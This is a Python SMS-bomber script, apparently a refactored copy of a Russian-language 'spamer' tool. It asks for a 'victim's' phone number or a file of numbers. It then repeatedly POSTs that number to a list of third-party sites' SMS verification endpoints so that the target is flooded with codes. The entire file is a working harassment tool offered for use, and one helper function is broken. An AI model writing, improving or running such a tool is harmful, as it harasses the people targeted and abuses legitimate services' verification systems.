#!/usr/bin/python3
# refactored boolshit
# author of refactoring: @r0tt3n-m3m0ry
# original spamer: https://github.com/FSystem88/spymer

try:
    import requests
except:
    print('You have to install missed modules via \'$ pip3 install -r requirements.txt\' before run this script.'); exit()

import ast
import os

def clear_screen():
    os.system('cls') if os.name == 'nt' else os.system('clear')

def mask(phone, phone_mask): # mask('+79055382025', '+# (###) ###-##-##') returns '+7 (905) 538-20-25':
    for number in phone:
        phone_mask = mask.replace('#', i, 1)
    return phone_mask

clear_screen()

list_of_phones = list()
list_of_senders = list()

while True:
    phones_uploading_mode = input('Как вы хотите указать номер жертвы?\n\n1. Запустить спамер на один номер \n2. Загрузить номера из .txt файла\n\nchoice > ')

    if phones_uploading_mode == '1':
        list_of_phones.append(input('\nВведите номер телефона жертвы (в международном формате): '))
        break
    elif phones_uploading_mode == '2':
        with open(input('\nВведите имя файла с номерами телефонов в международном формате, указав расширение файла (например, numbers.txt): ')) as file_with_phone_numbers:
            for phone_number in file_with_phone_numbers:
                if phone_number[0] == '+' and len(phone_number.strip()) == 12:
                    list_of_phones.append(phone_number.strip())
                else:
                    pass
        break
    else:
        print('Неверный ввод!\n\n')

sms_senders_filename = input('\nВведите имя файла с данными отправителей SMS: ')

with open(sms_senders_filename) as datafile:
    for data_string in datafile:
        list_of_senders.append(data_string)
    
for circle in range(int(input('\nВведите количество кругов: '))):
    print(f'\nКруг #{circle+1}')
    if True:
        for phone in list_of_phones:
            for data_string in list_of_senders:
                if data_string[0] == '#' or data_string == '\n':
                    pass
                else:
                    site_title = data_string.split(' <> ')[0]
                    site_link = data_string.split(' <> ')[1]
                    json_for_post = data_string.split(' <> ')[-2]
                    phone_type = data_string.split(' <> ')[-1].strip()

                    if phone_type == '1':
                        json_for_post = json_for_post.replace('>>SMS<<', phone)
                    elif phone_type == '2':
                        json_for_post = json_for_post.replace('>>SMS<<', phone.replace('+7', '8'))
                    elif phone_type == '3':
                        json_for_post = json_for_post.replace('>>SMS<<', phone.replace('+7', '7'))
                    elif phone_type == '4':
                        json_for_post = json_for_post.replace('>>SMS<<', phone[2:])
                    else:
                        print(f'[WARNING] Ошибка в строке сайта \'{site_title}\': неверный тип формата номера. Пропускаю.')
                        continue
                    
                    try:
                        requests.post(site_link, data=ast.literal_eval(json_for_post))
                        print(f'[INFO] На сайт \'{site_title}\' отправлен запрос SMS кода, передан номер телефона {phone}')
                    except:
                        print(f'[ERROR] Не удалось отправить запрос SMS кода на сайт \'{site_title}\', передан номер телефона {phone}')
